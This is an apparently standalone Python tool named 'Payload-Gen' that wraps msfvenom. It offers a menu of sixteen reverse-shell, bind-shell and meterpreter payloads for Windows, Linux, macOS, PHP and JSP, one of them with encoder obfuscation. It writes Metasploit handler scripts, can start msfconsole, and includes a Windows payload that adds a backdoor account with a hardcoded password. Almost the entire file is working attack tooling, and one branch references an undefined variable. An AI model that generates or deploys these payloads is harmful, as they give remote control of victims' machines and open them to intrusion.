#!/usr/bin/python

import base64
import re
import subprocess
import sys
import os
import shutil
import random
import string
import binascii
import time

def MainMenu():
	time.sleep(0)

print('''\033[1;31m                                         
 _____            _                 _         _____            
|  __ \          | |               | |       / ____|           
| |__) |_ _ _   _| | ___   __ _  __| |______| |  __  ___ _ __  
|  ___/ _` | | | | |/ _ \ / _` |/ _` |______| | |_ |/ _ \ '_ \ 
| |  | (_| | |_| | | (_) | (_| | (_| |      | |__| |  __/ | | |
|_|   \__,_|\__, |_|\___/ \__,_|\__,_|       \_____|\___|_| |_|
             __/ |                                             
            |___/            
\033[1;m\033[1;31m Creator: Jeevan Chandra''')

print('''\033[1;32m
Script granted NON-ROOT# Privileges!\033[1;m''')

#----------------------------------------------------------------
#
#--------------------------------------------------------------------------

# write a file to designated path
def write_file(path, text):
    file_write = open(path, "w")
    file_write.write(text)
    file_write.close()

print('''\033[1;35mLoading Modules:\033[1;m''')
#animation = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"]
animation = ["[■■□□□□□□□□□□□□□□□□□□]","[■■■■□□□□□□□□□□□□□□□□]", "[■■■■■■□□□□□□□□□□□□□□]", "[■■■■■■■■□□□□□□□□□□□□]", "[■■■■■■■■■■□□□□□□□□□□]", "[■■■■■■■■■■■■□□□□□□□□]", "[■■■■■■■■■■■■■■□□□□□□]", "[■■■■■■■■■■■■■■■■□□□□]", "[■■■■■■■■■■■■■■■■■■□□]", "[■■■■■■■■■■■■■■■■■■■■]"]
for i in range(len(animation)):
    time.sleep(0.1)
    sys.stdout.write("\r" + animation[i % len(animation)])
    sys.stdout.flush()

print('''\033[1;33m
1.windows/shell/reverse_tcp
2.windows/meterpreter/reverse_tcp
3.windows/x64/meterpreter/reverse_tcp
4.windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5
5.linux/x86/meterpreter/reverse_tcp
6.linux/x86/meterpreter/bind_tcp
7.php/meterpreter_reverse_tcp
8.java/jsp_shell_reverse_tcp > shell.jsp
9.java/jsp_shell_reverse_tcp > shell.war
10.cmd/unix/reverse_python
11.cmd/unix/reverse_bash 
12.cmd/unix/reverse_perl
13.osx/x86/shell_reverse_tcp
14.osx/x86/shell_bind_tcp
15.Create User [windows]
16.generic/shell_bind_tcp
\033[1;m''')


selection = int (input("Enter your choice: "))
#print('''\033[1;34m 
#Usage: Enter LHOST, LPORT: eth0 4444\033[1;m''')
#lhost, lport = input("Enter LHOST, LPORT: ").split()
#lport = input("Enter LPORT: ")

#============================================ For Payload 1 in selection ===================
if selection == 1:
	
	lhost, lport = input("Enter LHOST, LPORT: ").split()
	cmd="msfvenom -p windows/shell/reverse_tcp LHOST={0} LPORT={1} -f exe > shell.exe".format(lhost, lport)
	os.system(cmd)

	write_file("paygen.rc", "use multi/handler\nset LHOST {0}\nset LPORT {1}\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n".format(lhost ,lport))
	
	print('''\033[1;31mDo you want to start msfconsole [multi/handler]?\033[1;m''')
	selection = int (input("Enter your choice 1 or 0: "))
	if selection ==1:
		cmd=("msfconsole -r paygen.rc")
		os.system(cmd)	
	else:
		print('''\033[1;36m You can start msfconsole with [msfconsole -r paygen.rc]\033[1;m''')
		exit()


#============================================ For Payload 2 in selection ===================
if selection == 2:
	
	lhost, lport = input("Enter LHOST, LPORT: ").split()
	cmd="msfvenom -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f exe > shell.exe".format(lhost, lport)
	os.system(cmd)

	write_file("paygen.rc", "use multi/handler\nset LHOST {0}\nset LPORT {1}\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n".format(lhost ,lport))
	
	print('''\033[1;31mDo you want to start msfconsole [multi/handler]?\033[1;m''')
	selection = int (input("Enter your choice 1 or 0: "))
	if selection ==1:
		cmd=("msfconsole -r paygen.rc")
		os.system(cmd)	
	else:
		print('''\033[1;36m You can start msfconsole with [msfconsole -r paygen.rc]\033[1;m''')
		exit()

#============================================ For Payload 3 in selection ===================
if selection == 3:

	lhost, lport = input("Enter LHOST, LPORT: ").split()
	cmd="msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f exe > shell.exe".format(lhost, lport)
	os.system(cmd)

	write_file("paygen.rc", "use multi/handler\nset LHOST {0}\nset LPORT {1}\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n".format(lhost ,lport))
	
	print('''\033[1;31mDo you want to start msfconsole [multi/handler]?\033[1;m''')
	selection = int (input("Enter your choice 1 or 0: "))
	if selection ==1:
		cmd=("msfconsole -r paygen.rc")
		os.system(cmd)	
	else:
		print('''\033[1;36m You can start msfconsole with [msfconsole -r paygen.rc]\033[1;m''')
		exit()

#============================================ For Payload 4 in selection ===================
if selection == 4:

	lhost, lport = input("Enter LHOST, LPORT: ").split()
	cmd="msfvenom -a x86 -p windows/meterpreter/reverse_tcp  LHOST={0} LPORT={1} -e x86/shikata_ga_nai -i 5 -f exe > shell.exe".format(lhost, lport)
	os.system(cmd)

	write_file("paygen.rc", "use multi/handler\nset LHOST {0}\nset LPORT {1}\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n".format(lhost ,lport))
	
	print('''\033[1;31mDo you want to start msfconsole [multi/handler]?\033[1;m''')
	selection = int (input("Enter your choice 1 or 0: "))
	if selection ==1:
		cmd=("msfconsole -r paygen.rc")
		os.system(cmd)	
	else:
		print('''\033[1;36m You can start msfconsole with [msfconsole -r paygen.rc]\033[1;m''')
		exit()

#============================================ For Payload 5 in selection ===================
if selection == 5:

	lhost, lport = input("Enter LHOST, LPORT: ").split()
	cmd="msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f elf > shell.elf".format(lhost, lport)
	os.system(cmd)

	write_file("paygen.rc", "use multi/handler\nset LHOST {0}\nset LPORT {1}\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n".format(lhost ,lport))
	
	print('''\033[1;31mDo you want to start msfconsole [multi/handler]?\033[1;m''')
	selection = int (input("Enter your choice 1 or 0: "))
	if selection ==1:
		cmd=("msfconsole -r paygen.rc")
		os.system(cmd)	
	else:
		print('''\033[1;36m You can start msfconsole with [msfconsole -r paygen.rc]\033[1;m''')
		exit()

#============================================ For Payload 6 in selection ===================
if selection == 6:
	
	rhost, lport = input("Enter RHOST, LPORT: ").split()
	cmd="msfvenom -p linux/x86/meterpreter/bind_tcp RHOST={0} LPORT={1} -f elf > bind.elf".format(rhost, lport)
	os.system(cmd)

	print('''\033[1;36mPAYLOAD GETENRATED!!!!!!!\033[1;m''')

#============================================ For Payload 7 in selection ===================
if selection == 7:

	lhost, lport = input("Enter LHOST, LPORT: ").split()
	cmd="msfvenom -p php/meterpreter_reverse_tcp LHOST={0} LPORT={1} -f raw > shell.php".format(lhost, lport)
	os.system(cmd)

	write_file("paygen.rc", "use multi/handler\nset LHOST {0}\nset LPORT {1}\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n".format(lhost ,lport))
	
	print('''\033[1;31mDo you want to start msfconsole [multi/handler]?\033[1;m''')
	selection = int (input("Enter your choice 1 or 0: "))
	if selection ==1:
		cmd=("msfconsole -r paygen.rc")
		os.system(cmd)	
	else:
		print('''\033[1;36m You can start msfconsole with [msfconsole -r paygen.rc]\033[1;m''')
		exit()

#============================================ For Payload 8 in selection ===================
if selection == 8:

	lhost, lport = input("Enter LHOST, LPORT: ").split()
	cmd="msfvenom -p java/jsp_shell_reverse_tcp LHOST={0} LPORT={1} -f raw > shell.jsp".format(lhost, lport)
	os.system(cmd)

	write_file("paygen.rc", "use multi/handler\nset LHOST {0}\nset LPORT {1}\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n".format(lhost ,lport))
	
	print('''\033[1;31mDo you want to start msfconsole [multi/handler]?\033[1;m''')
	selection = int (input("Enter your choice 1 or 0: "))
	if selection ==1:
		cmd=("msfconsole -r paygen.rc")
		os.system(cmd)	
	else:
		print('''\033[1;36m You can start msfconsole with [msfconsole -r paygen.rc]\033[1;m''')
		exit()

#============================================ For Payload 9 in selection ===================
if selection == 9:

	lhost, lport = input("Enter LHOST, LPORT: ").split()
	cmd="msfvenom -p java/jsp_shell_reverse_tcp LHOST={0} LPORT={1} -f war > shell.war".format(lhost, lport)
	os.system(cmd)

	write_file("paygen.rc", "use multi/handler\nset LHOST {0}\nset LPORT {1}\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n".format(lhost ,lport))
	
	print('''\033[1;31mDo you want to start msfconsole [multi/handler]?\033[1;m''')
	selection = int (input("Enter your choice 1 or 0: "))
	if selection ==1:
		cmd=("msfconsole -r paygen.rc")
		os.system(cmd)	
	else:
		print('''\033[1;36m You can start msfconsole with [msfconsole -r paygen.rc]\033[1;m''')
		exit()

#============================================ For Payload 10 in selection ===================
if selection == 10:

	lhost, lport = input("Enter LHOST, LPORT: ").split()
	cmd="msfvenom -p cmd/unix/reverse_python LHOST={0} LPORT={1} -f raw > shell.py".format(lhost, lport)
	os.system(cmd)

	write_file("paygen.rc", "use multi/handler\nset LHOST {0}\nset LPORT {1}\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n".format(lhost ,lport))
	
	print('''\033[1;31mDo you want to start msfconsole [multi/handler]?\033[1;m''')
	selection = int (input("Enter your choice 1 or 0: "))
	if selection ==1:
		cmd=("msfconsole -r paygen.rc")
		os.system(cmd)	
	else:
		print('''\033[1;36m You can start msfconsole with [msfconsole -r paygen.rc]\033[1;m''')
		exit()

#============================================ For Payload 11 in selection ===================
if selection == 11:

	lhost, lport = input("Enter LHOST, LPORT: ").split()
	cmd="msfvenom -p cmd/unix/reverse_bash LHOST={0} LPORT={1} -f raw > shell.sh".format(lhost, lport)
	os.system(cmd)

	write_file("paygen.rc", "use multi/handler\nset LHOST {0}\nset LPORT {1}\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n".format(lhost ,lport))
	
	print('''\033[1;31mDo you want to start msfconsole [multi/handler]?\033[1;m''')
	selection = int (input("Enter your choice 1 or 0: "))
	if selection ==1:
		cmd=("msfconsole -r paygen.rc")
		os.system(cmd)	
	else:
		print('''\033[1;36m You can start msfconsole with [msfconsole -r paygen.rc]\033[1;m''')
		exit()
#============================================ For Payload 12 in selection ===================
if selection == 12:

	lhost, lport = input("Enter LHOST, LPORT: ").split()
	cmd="msfvenom -p cmd/unix/reverse_perl LHOST={0} LPORT={1} -f raw > shell.pl".format(lhost, lport)
	os.system(cmd)

	write_file("paygen.rc", "use multi/handler\nset LHOST {0}\nset LPORT {1}\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n".format(lhost ,lport))
	
	print('''\033[1;31mDo you want to start msfconsole [multi/handler]?\033[1;m''')
	selection = int (input("Enter your choice 1 or 0: "))
	if selection ==1:
		cmd=("msfconsole -r paygen.rc")
		os.system(cmd)	
	else:
		print('''\033[1;36m You can start msfconsole with [msfconsole -r paygen.rc]\033[1;m''')
		exit()
#============================================ For Payload 13 in selection ===================
if selection == 13:

	lhost, lport = input("Enter LHOST, LPORT: ").split()
	cmd="msfvenom -p osx/x86/shell_reverse_tcp LHOST={0} LPORT={1} -f macho > shell.macho".format(lhost, lport)
	os.system(cmd)

	write_file("paygen.rc", "use multi/handler\nset LHOST {0}\nset LPORT {1}\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n".format(lhost ,lport))
	
	print('''\033[1;31mDo you want to start msfconsole [multi/handler]?\033[1;m''')
	selection = int (input("Enter your choice 1 or 0: "))
	if selection ==1:
		cmd=("msfconsole -r paygen.rc")
		os.system(cmd)	
	else:
		print('''\033[1;36m You can start msfconsole with [msfconsole -r paygen.rc]\033[1;m''')
		exit()
#============================================ For Payload 14 in selection ===================
if selection == 14:

	rhost, lport = input("Enter RHOST, LPORT: ").split()
	cmd="msfvenom -p osx/x86/shell_bind_tcp RHOST={0} LPORT={1} -f macho > bind.macho".format(rhost, lport)
	os.system(cmd)

	write_file("paygen.rc", "use multi/handler\nset LHOST {0}\nset LPORT {1}\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j\n".format(lhost ,lport))
	
	print('''\033[1;36mPAYLOAD GETENRATED!!!!!!!\033[1;m''')
	
#============================================ For Payload 15 in selection ===================
if selection == 15:

	cmd="msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe > adduser.exe"
	os.system(cmd)

	print('''\033[1;36mUSER=hacker PASS=Hacker123$\033[1;m''')
		
#============================================ For Payload 16 in selection ===================
if selection == 16:

	rhost, lport = input("Enter RHOST, LPORT: ").split()
	cmd="msfvenom -p generic/shell_bind_tcp RHOST={0} LPORT={1} -f elf > term.elf".format(rhost, lport)
	os.system(cmd)

	print('''\033[1;36mPAYLOAD GETENRATED!!!!!!!\033[1;m''')
